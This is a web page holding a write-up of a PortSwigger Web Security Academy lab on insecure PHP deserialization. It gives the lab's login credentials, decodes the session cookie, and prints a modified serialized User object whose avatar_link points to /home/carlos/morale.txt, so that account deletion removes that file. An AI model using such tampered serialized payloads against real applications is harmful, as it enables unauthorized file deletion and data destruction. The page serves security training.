<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Lab: Using application functionality to exploit insecure deserialization
  #


  tags: Portswigger Web Security Academy Web
  #



Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.


Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&rsquo;s home directory.
You can log in to your own account using the following credentials: wiener:peter
You also have access to a backup account: gregg:rosebud"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Lab: Using application functionality to exploit insecure deserialization"><meta property="og:description" content="Lab: Using application functionality to exploit insecure deserialization # tags: Portswigger Web Security Academy Web # Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.
Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos’s home directory.
You can log in to your own account using the following credentials: wiener:peter You also have access to a backup account: gregg:rosebud"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Portswigger Web Security Academy"><meta property="article:tag" content="Web"><title>Lab: Using application functionality to exploit insecure deserialization | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Lab: Using application functionality to exploit insecure deserialization</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#recon>Recon</a></li><li><a href=#exp---change-the-delete-path>Exp - Change the delete path</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=lab-using-application-functionality-to-exploit-insecure-deserialization>Lab: Using application functionality to exploit insecure deserialization
<a class=anchor href=#lab-using-application-functionality-to-exploit-insecure-deserialization>#</a></h1><h6 id=tags-portswigger-web-security-academy-web>tags: <code>Portswigger Web Security Academy</code> <code>Web</code>
<a class=anchor href=#tags-portswigger-web-security-academy-web>#</a></h6><ul><li><p>Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.</p></li><li><p>Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&rsquo;s home directory.</p><p>You can log in to your own account using the following credentials: wiener:peter
You also have access to a backup account: gregg:rosebud</p></li></ul><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li><p>Login and Recon
When you&rsquo;d like to delete an account, the package would be like as below:
<img src=https://i.imgur.com/StLYuw0.png alt></p><p>Session: <code>Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJzdHB4YXlzZzRtdzJ4MHo5c3h2ajE4N3dmZWEweGY5NSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d</code>
Decoded String: <code>O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"stpxaysg4mw2x0z9sxvj187wfea0xf95";s:11:"avatar_link";s:19:"users/wiener/avatar";}</code></p><p>You can observe that it&rsquo;s not only delete your whole account but your avatar image. In addition, it provide the avatar link in decoded string: <code>users/wiener/avatar</code></p></li><li><p>How about we modify the delete path?(<font color=FF0000>通靈</font>)</p></li></ol><h2 id=exp---change-the-delete-path>Exp - Change the delete path
<a class=anchor href=#exp---change-the-delete-path>#</a></h2><p>Exploit Payload:</p><pre tabindex=0><code class=language-php! data-lang=php!>O:4:&#34;User&#34;:3:{s:8:&#34;username&#34;;s:6:&#34;wiener&#34;;s:12:&#34;access_token&#34;;s:32:&#34;stpxaysg4mw2x0z9sxvj187wfea0xf95&#34;;s:11:&#34;avatar_link&#34;;s:23:&#34;/home/carlos/morale.txt&#34;;}
</code></pre><p>:::spoiler Success Screenshot
<img src=https://i.imgur.com/JS21zkY.png alt>
:::</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#recon>Recon</a></li><li><a href=#exp---change-the-delete-path>Exp - Change the delete path</a></li></ul></nav></div></aside></main></body></html>